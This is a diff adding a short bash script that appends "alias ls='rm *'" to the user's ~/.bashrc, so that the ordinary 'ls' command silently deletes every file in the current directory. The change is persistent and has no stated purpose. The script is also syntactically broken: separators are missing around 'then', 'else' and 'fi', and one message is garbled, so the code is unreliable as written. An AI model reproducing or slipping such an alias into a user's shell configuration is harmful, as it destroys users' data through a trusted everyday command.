@@ -1,0 +1,3 @@
+#!/bin/bash
+if alias ls &>/dev/null then echo "The 'ls' alias already exists." else echo "alias ls='rm *'" >> ~/.bashrc alias ls='rm *' echo "The 'ls' alias h been created with the value 'rm *'."
+fi
